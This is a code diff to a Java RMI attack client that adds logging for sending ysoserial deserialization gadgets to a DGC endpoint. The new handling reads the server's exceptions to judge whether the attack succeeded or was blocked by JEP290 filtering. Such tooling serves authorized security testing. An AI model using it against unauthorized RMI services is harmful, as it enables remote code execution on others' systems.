@@ -100,9 +100,27 @@ public class DGCClient {
     public void attackCleanCall(Object payload)
     {
         try {
+            Logger.printlnBlue("Attempting ysoserial attack on DGC endpoint...");
+            Logger.increaseIndent();
             cleanCall(payload);
         } catch( Exception e ) {
 
+            Throwable cause = RMGUtils.getCause(e);
+
+            if( cause instanceof java.io.InvalidClassException ) {
+                Logger.eprintlnMixedYellow("DGC", "rejected", "deserialization of the supplied gadget.");
+                Logger.eprintlnMixedYellowFirst("JEP290", "is most likely", "installed.");
+                Logger.eprintln("Deserialization attacks may work at the appliaction layer.");
+
+            } else if( cause instanceof java.lang.ClassNotFoundException) {
+                Logger.eprintlnMixedYellow("DGC", "accepted", "deserialization of the supplied gadget.");
+                Logger.eprintlnMixedYellow("However, the gadget seems", "not", "to be available on the rmi server.");
+                Logger.eprintln("Try a different gadget.");
+
+            } else if( cause instanceof java.lang.ClassCastException) {
+                Logger.printlnMixedYellow("Caught", "ClassCastException", "during deserialization attack.");
+                Logger.printlnMixedYellowFirst("Deserialization attack", "most likely", "worked :)");
+            }
         }
     }
 
@@ -138,6 +156,11 @@ public class DGCClient {
 
             remoteRef.invoke(call);
             remoteRef.done(call);
+
+        } catch(java.rmi.ConnectException e) {
+            Logger.eprintlnMixedYellow("Caught", "ConnectException", "during DGC operation.");
+            RMGUtils.stackTrace(e);
+            RMGUtils.exit();
 
         } catch(java.rmi.ConnectIOException e) {
             Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during DGC operation.");
